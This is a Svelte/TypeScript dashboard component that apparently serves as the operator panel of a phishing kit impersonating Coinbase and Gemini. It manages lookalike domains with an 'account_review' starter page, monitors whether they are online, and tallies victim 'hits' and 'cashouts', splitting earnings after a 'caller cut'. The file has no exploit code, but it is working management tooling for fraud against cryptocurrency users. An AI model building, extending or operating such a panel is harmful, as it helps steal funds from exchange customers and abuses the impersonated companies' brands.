<script lang="ts">
	import { onMount } from 'svelte';
	import { fade, slide, scale } from 'svelte/transition';
	export let username: string;
	export let guild: string;

	import Coinbase from '$lib/images/coinbase-v2.svg';
	import Gemini from '$lib/images/gemini-dollar-gusd-logo.svg';

	interface Page {
		ID: number;
		URL: string;
		Template: string;
		starterPage: string;
		Status: string;
		earnings: number;
		hits: number;
	}

	let activePages: Page[] = [];
	let totalEarnings = 0;
	let netEarnings = 0;
	let totalHits = 0;
	let loading = true;
	let addDomainOpen = false;
	let showDeleteConfirm = false;
	let selectedTemplate = 'Coinbase';
	let domainInput = '';
	let searchTerm = '';
	let error: string | null = null;
	let selectedPage: Page | null = null;

	const templates = [
		{ name: 'Coinbase', logo: Coinbase },
		{ name: 'Gemini', logo: Gemini }
	];

	$: filteredPages = activePages.filter(
		(page) =>
			page.URL.toLowerCase().includes(searchTerm.toLowerCase()) ||
			page.Template.toLowerCase().includes(searchTerm.toLowerCase())
	);

	async function checkDomainStatus(domain: string): Promise<boolean> {
		try {
			const controller = new AbortController();
			const timeoutId = setTimeout(() => controller.abort(), 5000);
			const response = await fetch(`https://${domain}`, {
				signal: controller.signal
			});
			clearTimeout(timeoutId);
			return response.status === 200;
		} catch (error) {
			return false;
		}
	}

	function initiateDisconnect(page: Page) {
		selectedPage = page;
		showDeleteConfirm = true;
	}

	async function disconnectDomain() {
		if (!selectedPage) return;

		try {
			const response = await fetch('/api/guild/removeDomain', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					guild,
					url: selectedPage.URL
				})
			});

			if (response.ok) {
				await fetchData();
				showDeleteConfirm = false;
				selectedPage = null;
			} else {
				error = 'Failed to disconnect domain';
			}
		} catch (err) {
			error = 'Error disconnecting domain';
			console.error(err);
		}
	}

	async function addDomain() {
		try {
			const response = await fetch('/api/guild/addDomain', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({
					guild,
					url: domainInput,
					template: selectedTemplate
				})
			});

			if (response.ok) {
				addDomainOpen = false;
				domainInput = '';
				await fetchData();
			} else {
				error = 'Failed to add domain';
			}
		} catch (err) {
			error = 'Error adding domain';
			console.error(err);
		}
	}

	interface Cashout {
		id: number;
		amount: number;
		percentage_cut: number;
		status: string;
	}

	let cashouts: Cashout[] = [];

	async function fetchData() {
		try {
			// Fetch domains
			const domainsResponse = await fetch(`/api/guild/getDomains?guild=${guild}`);
			const domainsData = await domainsResponse.json();

			// Fetch cashouts
			const cashoutsResponse = await fetch(`/api/guild/getCashouts?guild=${guild}`);
			const cashoutsData = await cashoutsResponse.json();

			if (cashoutsData.success) {
				cashouts = cashoutsData.cashouts;

				// Calculate earnings
				totalEarnings = cashouts.reduce((sum, cashout) => sum + Number(cashout.amount), 0);

				// Calculate net earnings (total minus caller cuts)
				netEarnings = cashouts.reduce((sum, cashout) => {
					const callerCut = Number(cashout.amount) * (Number(cashout.percentage_cut) / 100);
					return sum + (Number(cashout.amount) - callerCut);
				}, 0);

				// Total hits is the count of cashout requests
				totalHits = cashouts.length;
			}

			// Process domains data as before
			activePages = await Promise.all(
				domainsData.map(async (domain: any, index: number) => {
					const isOnline = await checkDomainStatus(domain.url);
					return {
						ID: index + 1,
						URL: domain.url,
						Template: domain.template || 'Coinbase',
						starterPage: 'account_review',
						Status: isOnline ? 'Operational' : 'Offline',
						earnings: totalEarnings, // Use actual earnings instead of random
						hits: totalHits // Use actual hits instead of random
					};
				})
			);

			loading = false;
		} catch (err) {
			error = 'Error fetching data';
			console.error(err);
			loading = false;
		}
	}

	let statusCheckInterval: NodeJS.Timeout;

	onMount(() => {
		fetchData();
		statusCheckInterval = setInterval(async () => {
			activePages = await Promise.all(
				activePages.map(async (page) => {
					const isOnline = await checkDomainStatus(page.URL);
					return { ...page, Status: isOnline ? 'Operational' : 'Offline' };
				})
			);
			activePages = [...activePages];
		}, 30000);

		return () => {
			if (statusCheckInterval) clearInterval(statusCheckInterval);
		};
	});
</script>

<div class="overview">
	<div class="intro">
		<div class="header-content">
			<div class="title-section">
				<h1>Overview</h1>
				<p>An overview of your performance</p>
			</div>
			<div class="search-box">
				<span class="material-icons search-icon">search</span>
				<input type="text" bind:value={searchTerm} placeholder="Search domains..." />
			</div>
		</div>
	</div>

	{#if error}
		<div class="error-message" transition:slide>
			<span class="material-icons">error_outline</span>
			<p>{error}</p>
			<button class="close-error" on:click={() => (error = null)}>
				<span class="material-icons">close</span>
			</button>
		</div>
	{/if}

	{#if loading}
		<div class="loading">
			<div class="loader"></div>
			<span>Loading dashboard data...</span>
		</div>
	{:else}
		<div class="performance" transition:fade>
			<div class="stats-grid">
				<div class="stat-box">
					<p>Panel Status</p>
					<h2>
						{activePages.some((page) => page.Status === 'Operational') ? 'Operational' : 'Offline'}
					</h2>
				</div>

				<div class="stat-box">
					<p>Net Earnings</p>
					<h2>
						${netEarnings.toLocaleString('en-US', {
							minimumFractionDigits: 2,
							maximumFractionDigits: 2
						})}
					</h2>
				</div>

				<div class="stat-box">
					<p>Gross Earnings</p>
					<h2>
						${totalEarnings.toLocaleString('en-US', {
							minimumFractionDigits: 2,
							maximumFractionDigits: 2
						})}
					</h2>
				</div>

				<div class="stat-box">
					<p>Total Hits</p>
					<h2>{totalHits}</h2>
				</div>
			</div>

			<div class="table-section">
				<div class="table-header">
					<button class="add-btn" on:click={() => (addDomainOpen = true)}>
						<span class="material-icons">add</span>
						Add Domain
					</button>
				</div>

				<table>
					<thead>
						<tr>
							<th>ID</th>
							<th>URL</th>
							<th>Template</th>
							<th>Status</th>
							<th>Earnings</th>
							<th>Hits</th>
							<th>Actions</th>
						</tr>
					</thead>
					<tbody>
						{#each filteredPages as page}
							<tr transition:slide>
								<td>{page.ID}</td>
								<td class="url-cell">{page.URL}</td>
								<td>
									<div class="logoHolder">
										<img
											src={page.Template === 'Coinbase' ? Coinbase : Gemini}
											alt={page.Template}
											height="15"
											width="15"
										/>
										<span>{page.Template}</span>
									</div>
								</td>
								<td>
									<div class="status-badge {page.Status.toLowerCase()}">
										<span class="material-icons">
											{page.Status === 'Operational' ? 'check_circle' : 'error'}
										</span>
										<span>{page.Status}</span>
									</div>
								</td>
								<td>${page.earnings.toLocaleString()}</td>
								<td>{page.hits}</td>
								<td>
									<button class="disconnect-btn" on:click={() => initiateDisconnect(page)}>
										<span class="material-icons">link_off</span>
										Disconnect
									</button>
								</td>
							</tr>
						{/each}
					</tbody>
				</table>
			</div>
		</div>
	{/if}
</div>

{#if addDomainOpen}
	<div class="modal-overlay" transition:fade on:click={() => (addDomainOpen = false)}>
		<div class="modal" transition:scale on:click|stopPropagation>
			<h2>
				Add Domain
				<span class="closeBtn" on:click={() => (addDomainOpen = false)}>
					<span class="material-icons">close</span>
				</span>
			</h2>

			<div class="modal-content">
				<div class="input-group">
					<label>Template</label>
					<div class="template-select">
						{#each templates as template}
							<div
								class="template-option {selectedTemplate === template.name ? 'selected' : ''}"
								on:click={() => (selectedTemplate = template.name)}
							>
								<div class="logoHolder">
									<img src={template.logo} height="20" width="20" alt={template.name} />
									<span>{template.name}</span>
								</div>
							</div>
						{/each}
					</div>
				</div>

				<div class="input-group">
					<label>Domain Name</label>
					<input type="text" bind:value={domainInput} placeholder="Enter domain name..." />
				</div>

				<button class="submit-btn" on:click={addDomain}>Add Domain</button>
			</div>
		</div>
	</div>
{/if}

{#if showDeleteConfirm}
	<div class="modal-overlay" transition:fade on:click={() => (showDeleteConfirm = false)}>
		<div class="modal delete-modal" transition:scale on:click|stopPropagation>
			<h2>
				Disconnect Domain
				<span class="closeBtn" on:click={() => (showDeleteConfirm = false)}>
					<span class="material-icons">close</span>
				</span>
			</h2>

			<div class="modal-content">
				<div class="delete-warning">
					<span class="material-icons warning-icon">warning</span>
					<p>Are you sure you want to disconnect this domain?</p>
					<div class="domain-url">{selectedPage?.URL}</div>
					<p class="warning-text">This action cannot be undone.</p>
				</div>

				<div class="modal-actions">
					<button class="cancel-btn" on:click={() => (showDeleteConfirm = false)}>Cancel</button>
					<button class="disconnect-btn" on:click={disconnectDomain}>
						<span class="material-icons">link_off</span>
						Disconnect Domain
					</button>
				</div>
			</div>
		</div>
	</div>
{/if}

<style>
	.overview {
		padding: 2em;
	}

	.intro {
		padding-bottom: 1em;
		border-bottom: 1px solid #0f131d;
		margin-bottom: 2em;
	}

	.header-content {
		display: flex;
		justify-content: space-between;
		align-items: center;
	}

	.title-section h1 {
		color: white;
		margin: 0;
	}

	.title-section p {
		color: #888;
		margin: 0.5em 0 0 0;
	}

	.search-box {
		position: relative;
		width: 300px;
	}

	.search-box .search-icon {
		position: absolute;
		left: 1em;
		top: 50%;
		transform: translateY(-50%);
		color: #888;
		pointer-events: none;
		z-index: 1;
	}

	.search-box input {
		width: 100%;
		padding: 0.8em 1em 0.8em 3.8em;
		background: rgba(56, 35, 155, 0.2);
		border: 1px solid #0f131d;
		color: white;
		border-radius: 0.5em;
		transition: all 0.3s ease;
		box-sizing: border-box;
	}

	.search-box input:focus {
		outline: none;
		border-color: rgb(56, 35, 155);
		box-shadow: 0 0 0 2px rgba(56, 35, 155, 0.3);
	}

	.stats-grid {
		display: grid;
		grid-template-columns: repeat(4, 1fr);
		gap: 1em;
		margin-bottom: 2em;
	}

	.stat-box {
		padding: 1.5em;
		background: rgb(56, 35, 155);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, #0e0d15 60%);
		border: 1px solid #0f131d;
		border-radius: 1em;
		transition: transform 0.2s;
	}

	.stat-box:hover {
		transform: translateY(-2px);
	}

	.stat-box p {
		color: #888;
		margin: 0;
	}

	.stat-box h2 {
		color: white;
		margin: 0.5em 0 0 0;
	}

	.table-section {
		margin-top: 2em;
	}

	.table-header {
		display: flex;
		justify-content: flex-end;
		margin-bottom: 2em;
	}

	.add-btn {
		display: flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.8em 1.5em;
		background: #38239b;
		border: none;
		border-radius: 0.5em;
		color: white;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.add-btn:hover {
		background: #4c2fd3;
		transform: translateY(-2px);
	}

	table {
		width: 100%;
		text-align: left;
		padding: 2em;
		border: 1px solid #0f131d;
		background: rgb(56, 35, 155);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, #0e0d15 60%);
		border-radius: 1em;
	}

	th {
		font-weight: normal;
		padding: 1em;
		color: #888;
	}

	td {
		padding: 1em;
		color: white;
	}

	.logoHolder {
		display: flex;
		align-items: center;
		gap: 0.5em;
	}

	.status-badge {
		display: inline-flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.5em 1em;
		border-radius: 2em;
		font-size: 0.9em;
	}

	.status-badge.operational {
		background: rgba(35, 155, 56, 0.2);
		color: #7ff78f;
	}

	.status-badge.offline {
		background: rgba(155, 35, 35, 0.2);
		color: #f77f7f;
	}

	.disconnect-btn {
		display: flex;
		align-items: center;
		gap: 0.5em;
		padding: 0.5em 1em;
		background: rgba(155, 35, 35, 0.2);
		border: none;
		border-radius: 0.5em;
		color: #f77f7f;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.disconnect-btn:hover {
		background: rgba(155, 35, 35, 0.3);
		transform: translateY(-2px);
	}

	.modal-overlay {
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background: rgba(0, 0, 0, 0.8);
		display: flex;
		justify-content: center;
		align-items: center;
		z-index: 1000;
	}

	.modal {
		background: #0e0d15;
		border-radius: 1em;
		width: 500px;
		border: 1px solid rgb(56, 35, 155);
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
	}

	.delete-modal {
		width: 400px;
	}

	.modal h2 {
		display: flex;
		justify-content: space-between;
		align-items: center;
		padding: 1.5em;
		margin: 0;
		color: white;
		border-bottom: 1px solid rgba(56, 35, 155, 0.3);
	}

	.closeBtn {
		cursor: pointer;
		opacity: 0.7;
		transition: opacity 0.2s;
	}

	.closeBtn:hover {
		opacity: 1;
	}

	.modal-content {
		padding: 2em;
	}

	.input-group {
		margin-bottom: 1.5em;
	}

	.input-group label {
		display: block;
		color: #888;
		margin-bottom: 0.5em;
	}

	.input-group input {
		width: 100%;
		padding: 0.8em;
		background: rgba(56, 35, 155, 0.2);
		border: 1px solid #0f131d;
		color: white;
		border-radius: 0.5em;
		transition: all 0.3s ease;
		box-sizing: border-box;
	}

	.template-select {
		display: grid;
		grid-template-columns: 1fr 1fr;
		gap: 1em;
	}

	.template-option {
		padding: 0.75em;
		background: rgba(56, 35, 155, 0.2);
		border: 1px solid #0f131d;
		border-radius: 0.5em;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.template-option:hover {
		background: rgba(56, 35, 155, 0.3);
	}

	.template-option.selected {
		background: rgba(56, 35, 155, 0.4);
		border-color: rgb(56, 35, 155);
	}

	.delete-warning {
		text-align: center;
		color: white;
	}

	.warning-icon {
		font-size: 3em;
		color: #f77f7f;
		margin-bottom: 0.5em;
	}

	.domain-url {
		background: rgba(155, 35, 35, 0.2);
		color: #f77f7f;
		padding: 0.8em;
		border-radius: 0.5em;
		margin: 1em 0;
		font-family: monospace;
	}

	.warning-text {
		color: #f77f7f;
		font-size: 0.9em;
		margin-top: 1em;
	}

	.modal-actions {
		display: flex;
		justify-content: flex-end;
		gap: 1em;
		margin-top: 2em;
	}

	.cancel-btn {
		padding: 0.8em 1.5em;
		background: transparent;
		border: 1px solid #0f131d;
		color: #888;
		border-radius: 0.5em;
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.cancel-btn:hover {
		background: rgba(255, 255, 255, 0.1);
		color: white;
	}

	.submit-btn {
		width: 100%;
		padding: 0.8em;
		background: #38239b;
		border: none;
		border-radius: 0.5em;
		color: white;
		cursor: pointer;
		transition: all 0.3s ease;
		margin-top: 1em;
	}

	.submit-btn:hover {
		background: #4c2fd3;
		transform: translateY(-2px);
	}

	.error-message {
		background: rgba(155, 35, 35, 0.2);
		color: #ff4444;
		padding: 1em;
		border-radius: 0.5em;
		margin-bottom: 1em;
		display: flex;
		align-items: center;
		gap: 1em;
	}

	.close-error {
		background: none;
		border: none;
		color: #ff4444;
		cursor: pointer;
		padding: 0.5em;
		margin-left: auto;
	}

	.loading {
		text-align: center;
		padding: 4em;
		color: #888;
	}

	.loader {
		width: 40px;
		height: 40px;
		border: 3px solid rgba(56, 35, 155, 0.2);
		border-top-color: rgb(56, 35, 155);
		border-radius: 50%;
		animation: spin 1s linear infinite;
		margin: 0 auto 1em;
	}

	@keyframes spin {
		to {
			transform: rotate(360deg);
		}
	}
</style>
